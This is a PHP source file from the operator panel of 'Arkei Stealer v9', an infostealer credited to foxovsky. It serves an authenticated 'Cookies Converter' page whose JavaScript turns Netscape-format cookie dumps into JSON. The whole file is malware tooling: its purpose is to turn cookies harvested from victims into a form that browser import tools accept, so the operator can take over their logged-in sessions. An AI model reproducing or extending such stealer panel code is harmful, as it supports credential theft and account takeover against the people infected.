<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [converter.php]
*    Convert NETSCAPE to JSON
*    thanks AZORult
*/

session_start();

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$pageName = "Cookies Converter";

require("template/header.tmpl.php");

?>

<script>

 window.onload=function(){
   document.getElementById("textarea1").wrap='off';
 }
function NetscapeToJson(){
var textArea2 = document.getElementById("textarea2");
	textArea2.value = '';
	var arrObjects = [];
	var textArea1 = document.getElementById("textarea1");
	var arrayOfLines = textArea1.value.split("\n"); 
	var i = 0;
	for (i=0; i<arrayOfLines.length; i++){
		var kuka = arrayOfLines[i].split("\t"); 
		var cook = new Object();	
			cook.domain = kuka[0];
			cook.expirationDate = parseInt(kuka[4]);

			if (kuka[1] == "FALSE") cook.httpOnly = false;  
			if (kuka[1] == "TRUE") cook.httpOnly = true;  

			cook.name = kuka[5];
			cook.path = kuka[2];
			
			if (kuka[3] == "FALSE") cook.secure = false;  
			if (kuka[3] == "TRUE") cook.secure = true; 


			cook.value = kuka[6];  
			

			arrObjects[i] = cook;		
	}
	
	var cookieStr = JSON.stringify(arrObjects);
	
	
	textArea2.value = cookieStr;
	
	
	}
</script>

<div class="wrapper">
	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
					<h4 class="page-title">Cookie Converter</h4>
				</div>
			</div>
		</div>
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
					
						<h3>NETSCAPE: </h3>
						<textarea id="textarea1" wrap="soft" class="form-control" rows="20" style="width: 100%" onclick="this.select()"></textarea>
						<br>
						<button onclick="NetscapeToJson()" type="button" class="btn btn-success">Convert</button>
						
						<br>
						<br>
						<h3>JSON: </h3>
						<textarea id="textarea2" wrap="soft" class="form-control" rows="20" style="width: 100%" onclick="this.select()"></textarea>
					
					</div>
				</div>
			</div>
		</div>
	</div>
</div>